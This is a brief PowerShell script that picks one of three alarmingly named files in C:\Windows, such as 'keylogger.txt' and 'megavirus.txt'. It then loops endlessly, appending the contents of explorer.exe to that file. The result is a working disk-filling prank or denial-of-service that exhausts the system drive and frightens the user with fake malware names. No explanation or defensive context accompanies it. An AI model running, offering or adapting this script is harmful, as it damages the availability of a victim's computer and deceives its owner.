$files = @("C:\Windows\ie.log", "C:\Windows\keylogger.txt", "C:\Windows\megavirus.txt")

$i = Get-Random -Maximum $files.Length
$f = $files[$i]

while (1)
{
    #"salut" | Out-File -FilePath f -Append
    get-content C:\Windows\explorer.exe | Out-File -FilePath $f -Append
    #Start-Sleep 1
}
